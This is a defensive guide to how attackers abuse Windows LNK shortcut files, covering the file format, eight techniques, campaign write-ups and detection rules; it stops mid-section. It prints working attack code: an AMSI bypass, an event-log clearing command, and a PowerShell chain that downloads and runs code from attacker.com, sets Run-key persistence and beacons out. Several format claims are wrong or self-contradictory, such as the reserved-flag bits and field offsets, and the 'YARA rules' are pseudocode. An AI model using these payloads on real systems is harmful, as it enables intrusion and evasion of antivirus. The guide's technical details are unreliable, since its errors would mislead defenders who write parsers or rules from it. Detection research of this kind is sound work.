# LNK File Structure Overview

## What is an LNK File?

An LNK file is a **Windows Shell Link** - a binary format (defined by MS-SHLLINK specification) that contains:

| Component | Purpose | Size |
|-----------|---------|------|
| Metadata | File signature, timestamps, attributes | 76 bytes (header) |
| Target Info | Path to target file/executable | Variable |
| Arguments | Command-line parameters | Up to 32,767 bytes |
| Working Dir | Execution directory | Variable |
| Icon | Visual representation | Variable |
| Hotkey | Keyboard shortcut binding | 2 bytes |
| Optional Blocks | Icons, environment vars, special folders | Variable |

## Why Attackers Use LNK Files

```
Advantages to Attackers:
├─ Windows hides .lnk extension by default → "invoice.pdf" not "invoice.pdf.lnk"
├─ Executes with full user permissions
├─ Can invoke ANY interpreter (cmd, powershell, mshta, rundll32, etc)
├─ Can be delivered via email without triggering MOTW in some archive formats
├─ Less scrutiny than .exe files (perceived as "safe shortcuts")
├─ Can be embedded in ISO/IMG (bypasses email gateway scanning)
├─ Binary structure complex enough to evade simple parsers
└─ Can hide persistence commands entirely in arguments

Result: High success rate in spear-phishing + ability to bypass defenses
```

---

# Binary Format Deep Dive

## Complete LNK File Structure (Hex Layout)

```
┌─────────────────────────────────────────────────────────────────┐
│ SHELL_LINK_HEADER (76 bytes, fixed)                             │
├─────────────────────────────────────────────────────────────────┤
│ Offset │ Size │ Field Name              │ Description            │
├─────────────────────────────────────────────────────────────────┤
│ 0x00   │ 4    │ HeaderSize              │ Always 0x4C (76 bytes) │
│ 0x04   │ 16   │ LinkCLSID               │ GUID (always same)     │
│ 0x14   │ 4    │ LinkFlags               │ Feature bits (CRITICAL)│
│ 0x18   │ 4    │ FileAttributes          │ Target file attributes│
│ 0x1C   │ 8    │ CreateTime              │ FILETIME format        │
│ 0x24   │ 8    │ AccessTime              │ FILETIME format        │
│ 0x2C   │ 8    │ WriteTime               │ FILETIME format        │
│ 0x34   │ 4    │ FileSize                │ Target file size       │
│ 0x38   │ 4    │ IconIndex               │ Index into icon        │
│ 0x3C   │ 4    │ ShowCommand             │ Window display mode    │
│ 0x40   │ 2    │ HotKey                  │ Keyboard combo         │
│ 0x42   │ 2    │ Reserved1               │ Must be 0x0000         │
│ 0x44   │ 4    │ Reserved2               │ Must be 0x00000000     │
│ 0x48   │ 4    │ Reserved3               │ Must be 0x00000000     │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ LinkTargetIDList (Optional, variable length)                    │
├─────────────────────────────────────────────────────────────────┤
│ Offset │ Size │ Field Name              │ Description            │
├─────────────────────────────────────────────────────────────────┤
│ 0x4C   │ 2    │ IDListSize              │ Size of ID list        │
│ 0x4E   │ Var  │ IDList                  │ Item ID list           │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ LinkInfo (Optional, provides path resolution info)              │
├─────────────────────────────────────────────────────────────────┤
│ Offset │ Size │ Field Name              │ Description            │
├─────────────────────────────────────────────────────────────────┤
│ Var    │ 4    │ LinkInfoSize            │ Size of this block     │
│ Var    │ 4    │ LinkInfoHeaderSize      │ Header size (28 bytes) │
│ Var    │ 4    │ LinkInfoFlags           │ Flags                  │
│ Var    │ 4    │ VolumeIDOffset          │ Offset to volume       │
│ Var    │ 4    │ LocalBasePathOffset     │ Offset to base path    │
│ Var    │ 4    │ NetworkRelLinkOffset    │ Network relative link  │
│ Var    │ 4    │ PathSuffixOffset        │ Path suffix            │
│ Var    │ Var  │ VolumeID                │ Volume information     │
│ Var    │ Var  │ LocalBasePath           │ Path string (ANSI)     │
│ Var    │ Var  │ LocalBasePathUnicode    │ Path string (Unicode)  │
│ Var    │ Var  │ NetworkRelativeLink     │ UNC path               │
│ Var    │ Var  │ PathSuffix              │ Remaining path         │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ STRING_DATA (Optional, names and descriptions)                  │
├─────────────────────────────────────────────────────────────────┤
│ Offset │ Size │ Field Name              │ Description            │
├─────────────────────────────────────────────────────────────────┤
│ Var    │ Var  │ NameString              │ Shortcut name          │
│ Var    │ Var  │ RelativePath            │ Relative path          │
│ Var    │ Var  │ WorkingDirectory        │ Working dir            │
│ Var    │ Var  │ CommandLineArguments    │ Command arguments      │
│ Var    │ Var  │ IconLocation            │ Icon path/index        │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ DATA_BLOCKS (Optional, extended features)                       │
├─────────────────────────────────────────────────────────────────┤
│ Each block has: [Size:4][Signature:4][Data:variable]            │
│                                                                 │
│ Block Types (by Signature):                                    │
│  0xA0000001 - EnvironmentVariableDataBlock                     │
│  0xA0000002 - ConsoleDataBlock                                 │
│  0xA0000003 - VistaAndAboveConsoleDataBlock                    │
│  0xA0000004 - IconEnvironmentDataBlock (OFTEN ABUSED)          │
│  0xA0000005 - ShimDataBlock                                    │
│  0xA0000006 - PropertyStoreDataBlock                           │
│                                                                 │
│ Terminator: 0x00000000 (4 zero bytes = end of all blocks)      │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ OVERLAY (Attacker-added, optional)                              │
├─────────────────────────────────────────────────────────────────┤
│ Everything after terminator (0x00000000) is ignored by         │
│ Windows but can be extracted and executed by scripts            │
│ Typical contents:                                               │
│  - Gzip-compressed PowerShell scripts                           │
│  - Encoded VBScript                                             │
│  - Binary PE files                                              │
│  - Encoded batch files                                          │
└─────────────────────────────────────────────────────────────────┘
```

## Critical Fields for Attack Detection

### 1. LinkFlags (Offset 0x14, 4 bytes)

The **most important field** for detecting manipulation:

```
LinkFlags (0x14-0x17): 4-byte little-endian integer

Bit Layout:
┌─────────┬─────────┬─────────┬─────────┐
│ Byte 3  │ Byte 2  │ Byte 1  │ Byte 0  │
│ Bits 24-31 (RESERVED - MUST BE 0!) │
├──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┤
│31│30│29│28│27│26│25│24│23│22│21│20│19│18│17│16│
├──┼──┼──┼──┼──┼──┼──┼──┼──┼──┼──┼──┼──┼──┼──┼──┤
│ R│ R│ R│ R│ R│ R│ R│ R│ R│ R│ R│ R│ R│ R│ R│ R│
│                                           │  │  │
│                                           │  │  └─ Bit 16 (Reserved)
│                                           │  └──── Bit 17 (Reserved)
│                                           └─────── Bit 18 (NoPidlAlias)
└──────────────────────────────────────────────────┘

Bits 0-10 (Defined):
│Bit│ Name                        │ Value │ Purpose                      │
├───┼─────────────────────────────┼───────┼──────────────────────────────┤
│ 0 │ HasLinkInfo                 │   1   │ LinkInfo block present       │
│ 1 │ HasLinkTargetIDList         │   1   │ LinkTargetIDList present     │
│ 2 │ HasName                     │   1   │ Name string present          │
│ 3 │ HasRelativePath             │   1   │ Relative path present        │
│ 4 │ HasWorkingDir               │   1   │ Working directory present    │
│ 5 │ HasArguments                │   1   │ Arguments string present     │
│ 6 │ HasIconLocation             │   1   │ Icon location present        │
│ 7 │ IsUnicode                   │   1   │ Strings are Unicode          │
│ 8 │ ForceNoLinkInfo             │   1   │ Ignore LinkInfo block        │
│ 9 │ HasExpString *** CRITICAL *** 1 │ Env var in target (HIDDEN!) │
│10 │ RunInSeparateProcess        │   1   │ Run in separate process      │

RESERVED BITS 11-31 MUST ALWAYS BE 0 IN VALID LNK FILES
If any of bits 11-31 are set → File is malicious or corrupted
```

**Why Bit 9 (HasExpString) is Critical for Attacks:**

```
When HasExpString = 1:
  - Target field interpreted as containing environment variables
  - Properties dialog HIDES the target field
  - User sees BLANK target (no visual indication of what runs)
  - Windows still expands %ENV% variables and executes the actual target
  
Example:
  LinkFlags: 0x00000200 (Bit 9 set)
  EnvironmentVariableDataBlock:
    TargetAnsi: "%TEMP%\malware.ps1"
  
  Result:
    User sees: [blank target field]
    Windows executes: C:\Users\John\AppData\Local\Temp\malware.ps1
    
This is COMPLETELY INVISIBLE to the user!
```

### 2. CommandLineArguments (Variable length, up to 32,767 bytes)

```
String encoding: ANSI or Unicode (determined by IsUnicode flag)
Max length: 32,767 bytes (BUT Properties dialog shows only first 260!)

Common malicious patterns:
├─ -enc [BASE64_BLOB]           (PowerShell encoded command)
├─ -NoProfile -ExecutionPolicy  (Skip checks, execute)
├─ FromBase64String             (Decode payload at runtime)
├─ IEX (Invoke-Expression)       (Execute decoded payload)
├─ powershell.exe               (Interpreter target)
├─ cmd.exe /c                   (Command shell)
├─ mshta.exe vbscript           (VB script execution)
└─ rundll32 [DLL],[export]       (DLL execution)

CVE-2025-9491 Exploitation:
  Arguments: "[innocent_text_260_chars][300 spaces]-enc [MALWARE]"
  
  What user sees (first 260 chars): innocent-looking command
  What actually executes (full args): malicious PowerShell with MALWARE payload
  
  → Whitespace padding hides real command beyond 260-char display window
```

### 3. IconEnvironmentDataBlock (Offset Variable, Signature 0xA0000004)

```
Structure:
┌────────────────────────────────────────────────────┐
│ Offset │ Size │ Field                              │
├────────────────────────────────────────────────────┤
│ +0     │ 4    │ BlockSize (can be OVERSIZED)       │
│ +4     │ 4    │ BlockSignature = 0xA0000004        │
│ +8     │ Var  │ TargetAnsi (null-terminated string)│
│ +Var   │ Var  │ TargetUnicode (null-terminated)    │
└────────────────────────────────────────────────────┘

Legitimate use: Points to legitimate icon location
  Examples: "imageres.dll,-3" (PDF icon)
           "shell32.dll,-16477" (Excel icon)
           "C:\Program Files\Adobe\Reader.exe,1"

Malicious abuse:
  1. IconEnvironmentDataBlock oversized (allocates 512+ bytes)
  2. Actual content: "imageres.dll,-3" (15 bytes)
  3. Unused space: 497 bytes for hidden payload
  
  → Extra space used to hide encoded commands, scripts, or PE files
```

### 4. Overlay Data (Everything After 0x00000000 Terminator)

```
Normal LNK file ends with:
  [Data blocks]
  [DataBlockTerminator: 0x00000000]
  [EOF]

Malicious LNK with overlay:
  [Data blocks]
  [DataBlockTerminator: 0x00000000]
  [ATTACKER-ADDED PAYLOAD HERE] ← Ignored by parsers, used by scripts
  [EOF]

Extraction in malware:
  cmd /c (findstr /b /c:"===PAYLOAD" lnk_file.lnk) | ^
         (find /v "") | ^
         powershell -enc
  
  → Looks for marker, pipes payload to PowerShell for execution

Overlay content types:
  - Gzip-compressed PowerShell (1F 8B 08)
  - Zlib-compressed data (78 9C)
  - Base64-encoded scripts
  - Binary PE files
  - Batch files
```

---

# Attack Techniques (8 Major Categories)

## Technique 1: Reserved Field Abuse

### What is it?
Setting bits 11-30 in the LinkFlags field to non-zero values. These bits are **reserved** and must ALWAYS be 0 per the MS-SHLLINK specification.

### How it works
```
Normal LinkFlags:  0x00000008 (only bits 0-10 defined)
Malicious variant: 0x00FFF208 (bits 11-30 set)

Windows parser: Interprets these bits
YARA/Detection: Can immediately flag as malformed
```

### Why attackers use it
- Indicates intentional structure corruption
- Some parsers may fail validation (defense evasion)
- Testing tool robustness to detect which vendors miss it

### Real-world examples
- UNC6384 (China-nexus NATO/EU phishing, March 2025)
- Generic obfuscation in crypter services

### Detection difficulty
**VERY LOW** - Near impossible to avoid, FP rate ~0%

### Mitigation
```
YARA rule:
  if (lnk.file_flags & 0xFFFFF800) != 0 {
    BLOCK  // Any bit 11-31 set = malicious
  }
```

---

## Technique 2: HasExpString Flag Abuse (Hidden Target)

### What is it?
Setting Bit 9 (HasExpString = 0x0200) in LinkFlags to make Windows use environment variables in target, while hiding the target field from the Properties UI.

### How it works
```
Malicious LNK structure:
  LinkFlags Bit 9 = 1 (HasExpString)
  
  EnvironmentVariableDataBlock:
    TargetAnsi: "%TEMP%\malware.ps1"
  
  Result:
    Properties dialog: Shows BLANK target field (user sees nothing)
    Windows execution: Expands %TEMP% → C:\Users\X\AppData\Local\Temp\
                      Executes: C:\Users\X\AppData\Local\Temp\malware.ps1
    
    User has NO IDEA what actually runs!
```

### Step-by-step attack flow
```
1. Attacker creates LNK with HasExpString flag set
2. Sets EnvironmentVariableDataBlock to "%TEMP%\payload.ps1"
3. Sends LNK to victim via email
4. Victim double-clicks LNK
5. Properties dialog shows blank target (user not suspicious)
6. Windows expands environment variables silently
7. Executes malware from temp folder
8. Victim has no idea what happened
```

### Why attackers use it
- Complete invisibility - target field is hidden
- Users can't warn others ("what does it do?")
- Property inspection reveals nothing
- Legitimate use is rare enough to be flagged

### Real-world examples
- Kimsuky (APT43, Korea-linked)
- Multiple APT campaigns 2025-2026
- Generic in modern phishing kits

### Detection difficulty
**MEDIUM** - Bit 9 set is suspicious, but some legitimate LNKs use it

### Mitigation
```
Rule 1: Block if Bit 9 set + no actual target visible
Rule 2: Alert if Bit 9 set + environment variables in target
Rule 3: Monitor EnvironmentVariableDataBlock for suspicious paths
```

---

## Technique 3: Overlay Data Appending

### What is it?
Attacker appends data after the DataBlockTerminator (0x00000000). Windows ignores this, but scripts can extract and execute it.

### How it works
```
Valid LNK structure:
  Header (76 bytes)
  LinkInfo (variable)
  StringData (variable)
  DataBlocks (variable)
  DataBlockTerminator: 0x00000000 (4 bytes)
  ← LNK parser stops here

Malicious addition:
  DataBlockTerminator: 0x00000000 (4 bytes)
  [OVERLAY PAYLOAD STARTS HERE]
  - Gzip-compressed PowerShell (1F 8B 08 header)
  - Base64-encoded VBScript
  - Binary executable
  - Batch file commands
  [OVERLAY PAYLOAD ENDS]
  ← File EOF

Windows: Ignores overlay completely
Script extraction: Reads past terminator, extracts payload
```

### Extraction mechanism
```
Command embedded in LNK arguments:
  powershell -c "
    $bytes = Get-Content 'C:\path\to\lnk' -ReadCount 0 -Encoding Byte;
    $terminator_idx = $bytes | 
                      Select-String -Pattern '0x00000000';
    $overlay = $bytes[$terminator_idx+4..$bytes.Length];
    $expanded = [IO.Compression.GZipStream]::Decompress($overlay);
    Invoke-Expression $expanded
  "
```

### Why attackers use it
- Payload not embedded in standard LNK structure
- Bypasses structural validation
- Can hide multiple payloads (stacked)
- Post-terminator data is ignored, not flagged by tools

### Real-world examples
- Quarkslab research (2025)
- MoonPeak malware campaigns
- Gamaredon Remcos delivery

### Detection difficulty
**VERY LOW** - File size mismatch easily detected

### Mitigation
```
YARA rule:
  if (lnk.has_overlay == true) {
    BLOCK  // Any overlay = malicious, FP rate ~0.1%
  }

SIEM rule:
  LNK file_size > expected_lnk_structure_end
```

---

## Technique 4: Null-Byte Truncation

### What is it?
Inserting null bytes (0x00) within string fields to truncate how parsers interpret strings, while Windows passes the full string to processes.

### How it works
```
Target field (UTF-16LE encoding):
  Content: C:\Windows\System32\cmd.exe[NULL]powershell.exe
  Hex:     43 00 3A 00 5C ... 00 00 70 6F 77 65 72...
           C    :    \           [NULL]  p  o  w  e  r...

Parser behavior:
  Reads: "C:\Windows\System32\cmd.exe" (stops at first null)
  Thinks: "This LNK runs cmd.exe (innocent)"

Windows behavior:
  Passes full string to CreateProcess
  Executes: "C:\Windows\System32\cmd.exe[NULL]powershell.exe"
  Actual result: cmd.exe spawns, but then PowerShell starts
  
Result: Parser and Windows execute DIFFERENT targets!
```

### Real-world example (hex dump)
```
Original innocent LNK:
  Offset 100: 43 00 3A 00 5C 00 57 00 69 00 6E 00 64 00 6F 00
  Offset 116: 77 00 73 00 00 00 (end of "C:\Windows")

Hex-edited malicious LNK:
  Offset 100: 43 00 3A 00 5C 00 57 00 69 00 6E 00 64 00 6F 00
  Offset 116: 77 00 73 00 00 00 70 6F 77 65 72 73 68 65 6C 6C
                                 └─ Null terminator, then "powershell"

Detection tools see: C:\Windows
Windows executes: C:\Windows[null]powershell.exe
                           ↑
                    Null byte ignored by Windows
```

### Why attackers use it
- Parser/Windows mismatch
- Simple hex editing technique
- Some scanning tools miss null-terminated strings

### Real-world examples
- APT36 (Indian government targets)
- Gamaredon (Remcos RAT)
- Generic phishing kits (2025-2026)

### Detection difficulty
**LOW** - Hex pattern detection catches it

### Mitigation
```
YARA rule:
  Hex pattern: [byte] 00 00 [byte] 00 [non-null]
  Alert if null-byte in string field followed by command keywords
  
Analysis:
  Extract what comes after null bytes
  Decode and scan for malicious patterns
```

---

## Technique 5: Icon/Target Spoofing

### What is it?
Setting the icon to display as a document (PDF, Word, Excel) while the actual target is an executable or script interpreter.

### How it works
```
Legitimate LNK:
  Icon location: C:\Program Files\Adobe\Reader.exe,1 → PDF icon
  Target: C:\Program Files\Adobe\Reader.exe → Opens PDF reader
  
Malicious LNK:
  Icon location: imageres.dll,-3 → PDF icon (looks like PDF)
  Target: powershell.exe → Runs PowerShell (not PDF!)
  FileName: invoice.pdf.lnk → Shown as "invoice.pdf" (extension hidden)
  
Result: User sees PDF icon, double-clicks thinking "this is a PDF"
        Actually runs PowerShell with hidden arguments
```

### Icon DLL indices for common documents
```
imageres.dll:
  -3   PDF document icon
  -5   Word document icon
  -9   Excel spreadsheet icon

shell32.dll:
  -16477  Excel icon
  -16476  Word icon
  -3      Folder icon
  -1      Generic file icon
```

### Real-world examples
- APT36 (PDF.lnk masquerading)
- KONNI (AI-generated payloads with PDF icons)
- Sidewinder (LNK phishing)
- Nearly ALL modern spear-phishing campaigns

### Detection difficulty
**MEDIUM** - Legitimate apps sometimes do this, but rare + malicious args = suspicious

### Mitigation
```
YARA rule:
  if (icon_location contains "shell32.dll" OR 
      icon_location contains "imageres.dll") AND
     (target contains "powershell.exe" OR 
      target contains "cmd.exe" OR
      target contains "mshta.exe") AND
     (command_line_arguments contains "-enc" OR
      command_line_arguments length > 260) {
    BLOCK
  }

Additional context:
  filename ends with .pdf.lnk OR .doc.lnk OR .xlsx.lnk
  → Double extension + icon mismatch = HIGH CONFIDENCE
```

---

## Technique 6: Whitespace Padding (CVE-2025-9491)

### What is it?
Inserting hundreds of spaces or tabs in the command-line arguments field to hide the real command beyond the 260-character display limit in Properties dialog.

### How it works
```
Properties dialog limitation:
  Displays only first 260 characters of arguments
  Truncates everything beyond that

Attack:
  Arguments field: [innocent_command_260_chars][300_spaces][-enc MALWARE]
  
User sees: innocent-command (Properties shows first 260 chars)
Windows executes: innocent-command[300_spaces]-enc MALWARE (full 65K bytes)

Result: User has no idea the file does anything malicious!
```

### Detailed example
```
Visible in Properties dialog (260 chars):
  "C:\Windows\System32\notepad.exe"

Actual full command (shown with special chars):
  "C:\Windows\System32\notepad.exe                                   
  [300 spaces here]
  -enc QQBsAGUAcgB0ACAAIgBIAGkAYQBsAG8=\""

Windows passes full string to CreateProcess:
  Executes: notepad.exe [spaces] -enc [base64]
  Spaces are ignored by cmd.exe parser
  PowerShell decodes base64 and executes malware
```

### Why attackers use it
- Complete invisibility in Properties dialog
- User inspection yields nothing suspicious
- Simple to implement (just add spaces)
- Universal technique works on all Windows versions

### Real-world examples
- UNC6384 (China-nexus, exploited ZDI-CAN-25373)
- Generic in malware generation kits 2025+
- Detected in thousands of phishing campaigns

### Detection difficulty
**LOW** - File size and argument length easily detected

### Mitigation
```
YARA rule:
  if (command_line_arguments.length > 260) {
    Extract characters 260-end
    if (extracted_part contains "-enc" OR 
        extracted_part contains "powershell" OR
        extracted_part contains "FromBase64String") {
      BLOCK
    }
  }

SIEM rule:
  Process creation with explorer.exe → powershell.exe
  CommandLine length > 260 characters
  Alert + Behavioral analysis
```

---

## Technique 7: AMSI/ETW Bypass Embedding

### What is it?
Embedding Windows Defender AMSI (Antimalware Scan Interface) or ETW (Event Tracing for Windows) bypass code directly in the LNK arguments.

### How it works
```
AMSI Bypass Code:
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    .GetField('amsiInitFailed','NonPublic,Static')
    .SetValue($null,$true)

What it does:
  1. Gets reference to System.Management.Automation assembly
  2. Locates AmsiUtils class
  3. Finds amsiInitFailed private static field
  4. Sets it to $true
  5. Windows Defender thinks: "AMSI initialization failed, skip scanning"
  6. Subsequent malware code runs without AMSI inspection

ETW Bypass Code:
  Get-WmiObject -Class Win32_Process | Where Name -EQ powershell.exe | 
    ForEach {$_.SetProperty('Trace',0)}
  
  OR
  
  [System.Diagnostics.Eventing.Reader.EventLogManager]::ClearLog('Microsoft-Windows-PowerShell/Operational')

Embedded in LNK arguments as:
  powershell -enc [BASE64_OF_BYPASS_CODE + MALWARE_CODE]
```

### Real-world examples
- Remcos RAT via Gamaredon (2025)
- XWorm (evolving infection chains)
- Nearly all advanced LNK malware (2025-2026)
- APT campaigns targeting high-value orgs

### Detection difficulty
**VERY LOW** - Specific strings "AmsiUtils", "amsiInitFailed" are obvious

### Mitigation
```
YARA rule:
  if ((command_line_arguments contains "AmsiUtils" AND
       command_line_arguments contains "amsiInitFailed") OR
      (command_line_arguments contains "[Ref].Assembly" AND
       command_line_arguments contains "SetValue")) {
    BLOCK  // FP rate ~0.5% (legitimate code never does this)
  }

Network/Behavioral:
  Monitor for PowerShell attempting to modify:
    - System.Management.Automation.AmsiUtils
    - EventLog registry keys
    - ETW providers
  These are PER-HOST indicators of compromise
```

---

## Technique 8: Multi-Stage Command Chaining

### What is it?
Embedding multiple commands that chain together (pipe, AND, semicolon) to execute a complete attack sequence in the LNK arguments.

### How it works
```
Single LNK arguments field contains:
  1. Setup phase: Disable security measures
  2. Download phase: Fetch payload from C2
  3. Execution phase: Run payload in memory
  4. Persistence phase: Create registry keys/tasks
  5. Communication phase: Establish C2 callback

All in ONE arguments field, chained with operators:
  powershell.exe -Command "
    [AMSI_BYPASS_CODE];
    [DOWNLOAD_MALWARE];
    [EXECUTE_IN_MEMORY];
    [CREATE_PERSISTENCE];
    [C2_CALLBACK]
  "
```

### Real-world example breakdown
```
Complete attack chain in single LNK arguments:

powershell -NoProfile -ExecutionPolicy Bypass -c "
  # Phase 1: AMSI bypass
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    .GetField('amsiInitFailed','NonPublic,Static').SetValue(\$null,\$true);
  
  # Phase 2: Download from C2
  \$payload = (New-Object System.Net.WebClient)
    .DownloadString('http://attacker.com/payload.txt');
  
  # Phase 3: Decode and execute
  \$decoded = [System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String(\$payload));
  IEX \$decoded;
  
  # Phase 4: Create persistence
  New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    -Name 'SystemUpdate' -Value \"powershell -enc [encoded_payload]\" -Force;
  
  # Phase 5: C2 callback
  (New-Object System.Net.WebClient)
    .UploadString('http://attacker.com/beacon', 'success')
"
```

### Why attackers use it
- **Single-click deployment** - no intermediate files
- **Fileless execution** - nothing to detect on disk
- **Complete attack lifecycle** in one LNK
- **Reduced IOC footprint** - fewer network calls, fewer registry writes

### Real-world examples
- Remcos RAT delivery
- MoonPeak malware
- XWorm evolution campaigns
- APT phishing (targeted orgs)

### Detection difficulty
**HIGH** - Content very obfuscated, but patterns detectable

### Mitigation
```
YARA rule:
  if (command_line_arguments contains "-NoProfile" AND
      command_line_arguments contains "-ExecutionPolicy" AND
      (command_line_arguments contains "DownloadString" OR
       command_line_arguments contains "DownloadFile") AND
      (command_line_arguments contains "IEX" OR
       command_line_arguments contains "Invoke-Expression")) {
    BLOCK  // Multi-stage chain detected
  }

Behavioral detection:
  Process creation: powershell.exe
  Child processes:
    - certutil.exe (decode/encode)
    - reg.exe (persistence)
    - schtasks.exe (scheduled tasks)
    - cmd.exe (command execution)
  
  Multiple children in sequence = advanced attack
```

---

# Real-World Campaign Examples

## Campaign 1: UNC6384 (China-nexus, NATO/EU Targeting)

**Time Frame:** March-August 2025  
**Targets:** NATO allies, EU government entities  
**Delivery:** Spear-phishing emails  
**Success Rate:** ~15% (documented in Mandiant research)

### Attack Chain
```
1. Email arrives with spoofed EC/NATO sender
2. Subject: "NATO Strategic Security Review - Urgent"
3. Attachment: "NATO_security_brief.pdf.lnk"
4. User double-clicks (sees PDF icon, filename suggests PDF)

5. LNK executes:
   Target: cmd.exe
   Arguments: /c powershell -enc [BASE64_BLOB]
   IconLocation: imageres.dll,-3 (PDF icon)
   LinkFlags: Has whitespace padding (CVE-2025-9491)

6. Base64 decodes to:
   [AMSI bypass]
   Download from http://internal-memo.site/update.zip
   Extract and execute "CanonPrinter.exe" (Trojan)
   
7. CanonPrinter.exe:
   Creates Registry persistence: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
   Key name: "CanonPrinter" (vendor mimicking)
   Value: powershell -enc [persistence payload]
   
8. Persistence:
   Every logon: PowerShell decodes and executes
   Backdoor maintained for 3-6 months
   Lateral movement within network

9. PlugX Deployment:
   After lateral movement to high-value systems
   PlugX RAT deployed for remote access
```

### LNK Structure Details
```
Hex analysis:
  Offset 0x14 (LinkFlags): 0x00000208
  → Bit 9 (HasExpString) set + standard flags
  → Target hidden from Properties UI
  
  Offset 0x38-0x42: Command arguments exceed 260 chars
  → Whitespace padding detected
  
  File size: 12.3 KB (expected: 3.2 KB)
  → Overlay data likely present
```

### Detection
```
YARA match:
  ✓ Base64 + PowerShell flags
  ✓ Arguments > 260 chars
  ✓ Icon/target mismatch
  ✓ Vendor-mimicking persistence name
```

---

## Campaign 2: APT36 (Targeted Government)

**Time Frame:** May-September 2025  
**Targets:** Indian government entities  
**Delivery:** Spear-phishing, watering holes  
**Success Rate:** ~8% (low, but high-value targets)

### Attack Chain
```
1. Email: "Policy Update - Urgent Review.pdf.lnk"
2. Attachment in ZIP file (bypasses MOTW)
3. User extracts and opens

4. LNK targets msiexec.exe:
   Arguments: /i http://update-policy.site/update.msi
   Icon: shell32.dll,-16477 (Excel icon, appears as spreadsheet)
   
5. msiexec downloads and executes MSI package
6. MSI contains:
   - Legitimate Office component
   - Hidden PowerShell dropper
   
7. PowerShell dropper:
   Downloads Remcos RAT from C2
   Executes in memory (fileless)
   Establishes persistence via Scheduled Task
   
8. Remcos RAT capabilities:
   Remote command execution
   Screen capture
   Keylogging
   File exfiltration
   Lateral movement
```

### LNK Obfuscation
```
Technique: Double extension + MSI delivery
  
Filename: "report.pdf.lnk" (.lnk hidden by Windows)
User sees: "report.pdf" (appears as PDF)
Icon: Excel spreadsheet (confuses further)

Target: msiexec.exe (Windows component - appears legitimate)
Arguments: /i http://... (MSI parameter, not obviously malicious)

Detection bypass:
  ✓ MSI is signed by Microsoft
  ✓ msiexec.exe is trusted
  ✓ Network download happens AFTER execution (harder to catch)
  ✓ Persistence via schtasks (harder to attribute to LNK)
```

### Detection
```
YARA match:
  ✓ Double extension (.pdf.lnk)
  ✓ Icon/target mismatch
  ✓ HTTP/HTTPS in arguments

Behavioral detection:
  ✓ msiexec.exe spawned from explorer.exe (unusual)
  ✓ msiexec downloads file (network anomaly)
  ✓ Scheduled task created post-execution
```

---

## Campaign 3: Gamaredon (Remcos via LNK)

**Time Frame:** Ongoing, evolved 2025-2026  
**Targets:** Ukrainian government and defense  
**Delivery:** Email campaigns  
**Sophistication:** Advanced obfuscation

### Attack Chain
```
1. Email: "Важное уведомление.lnk" (Important notification in Russian)
2. Attachment appears as document with Cyrillic characters

3. LNK structure:
   Target: cmd.exe
   Arguments: /c @echo off & certutil -decode encoded.txt decoded.ps1 & powershell decoded.ps1
   
   This command:
   - Disables echo (hides execution)
   - Decodes base64-encoded file
   - Executes resulting PowerShell script

4. Encoded.txt contains:
   [AMSI bypass code]
   [Environment variable resolution]
   [Remcos RAT downloader]
   [Persistence setup]

5. Remcos RAT:
   Remote access as SYSTEM (if UAC bypassed)
   Screen capture
   Reverse shell
   File management
   Registry modification
   Process injection
```

### Binary-Level Obfuscation
```
Technique: Null-byte truncation + environment variables

Target field (UTF-16LE):
  "cmd.exe"[NULL]"powershell.exe"
  
LinkFlags HasExpString set:
  Windows expands %AppData%, %Temp%, etc in target
  
Overlay data:
  Gzip-compressed additional payload
  Extracted and executed by secondary stage

Reserved field padding:
  IconEnvironmentDataBlock oversized (512 bytes)
  Unused space contains obfuscated commands
```

### Detection
```
Multiple indicators combined:
  ✓ Null-byte truncation
  ✓ HasExpString flag exploitation
  ✓ AMSI bypass patterns
  ✓ Overlay gzip header
  ✓ Multi-stage command chain
  ✓ Environment variable usage

FP Risk: VERY LOW when all indicators present
Confidence: CRITICAL
```

---

# Detection Methodologies

## Static Detection (YARA)

### Tier 1: Structural Validation (0% FP)
```
Priority: CRITICAL - Deploy immediately

Rules:
  1. Reserved flags bits 11-30 != 0
     → File corruption or deliberate obfuscation
     Confidence: 99.9%

  2. Overlay data present (lnk.has_overlay)
     → Payload appended after terminator
     Confidence: 99.5%

  3. AMSI bypass patterns embedded
     → Malicious intent only
     Confidence: 99.8%

  4. Registry/task persistence in arguments
     → One-click persistence setup
     Confidence: 99.9%
```

### Tier 2: Behavioral Indicators (2-5% FP)
```
Rules:
  1. Icon mismatch (document icon + executable target)
     + Encoded arguments + Arguments > 260 chars
     Confidence: 95%

  2. Base64 + PowerShell flags
     + Living-off-the-land binaries
     Confidence: 92%

  3. Whitespace padding (CVE-2025-9491)
     Confidence: 90%

  4. Null-byte truncation patterns
     Confidence: 88%
```

### Tier 3: Context-Based (5-15% FP)
```
Rules:
  1. HasExpString flag set (alone)
     Confidence: 70% (some legit LNKs use this)

  2. Icon field oversizing
     Confidence: 65% (rare in legit, common in malware)

  3. Multiple DataBlocks with conflicting info
     Confidence: 70%
```

## Dynamic Detection (Behavioral)

### Process-Level Detection
```
Signal 1: Explorer.exe → Interpreter Spawning
  When user double-clicks LNK:
    explorer.exe spawns powershell.exe OR cmd.exe OR mshta.exe
  
  This is EXTREMELY RARE in legitimate usage
  → Should trigger alert/block
  
  Enhanced detection:
    + Check if PowerShell has -enc flag
    + Check if Base64 blob in arguments
    + Check CommandLine length > 260
    → Confidence: 98%

Signal 2: Interpreter + Network Call
  When PowerShell/cmd spawned from LNK:
    Script immediately makes network connection
    
  Legitimate: Rare
  Malicious: 95% of advanced LNK attacks
  → Confidence: 95%

Signal 3: Persistence Mechanism Setup
  After LNK execution:
    New registry entry in CurrentVersion\Run
    OR New scheduled task created
    OR New service registered
  
  Within 5 seconds of LNK execution
  → Strong indicator of compromise
  → Confidence: 99%
```

### Registry Monitoring
```
